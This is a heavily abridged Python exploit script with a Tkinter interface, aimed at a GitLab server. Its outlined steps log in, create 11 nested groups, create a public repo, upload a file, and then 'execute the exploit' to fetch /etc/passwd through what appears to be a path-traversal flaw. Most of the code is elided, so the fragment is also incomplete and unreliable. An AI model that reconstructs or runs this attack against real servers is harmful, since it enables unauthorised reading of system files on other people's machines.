...
# Ignore invalid SSL
        ...
        def request(method, path, data=None, files=None, headers=None):
            ...
            if response.status_code != 200:
                ...
                txtarea.insert(END, f"[*] Request failed: {method} - {path} => {response.status_code}")
...
# Login
        txtarea.insert(END, "[*] Attempting to login...")
        #print("[*] Attempting to login...")
        request("POST", "/users/sign_in",data={"user[login]": USERNAME, "user[password]": PASSWORD},)
        txtarea.insert(END, f"[*] Login successful as user '{USERNAME}'")
...
# Create groups
       ...
       # print(f"[*] Creating 11 groups with prefix {group_prefix}")
        txtarea.insert(END, f"[*] Creating 11 groups with prefix {group_prefix}")
        parent_id = ""
        for i in range(1, 12):
    # Create group
    ...
    # Get group id
            ...
            txtarea.insert(END, f"[*] Created group '{name}'")
...
# Create project
        ...
        txtarea.insert(END, f"[*] Created public repo '{repo_path}'")
...
# Upload file
        ...
        txtarea.insert(END, f"[*] Uploaded file '{file_url}'")
# Get /etc/passwd
        ...
        txtarea.insert(END, f"[*] Executing exploit, fetching file '/etc/passwd': GET - {exploit_path}")
    ...
    Hacher = Label(root, text="Enter domin https://gitlab.example.com/login/uers : ").pack()
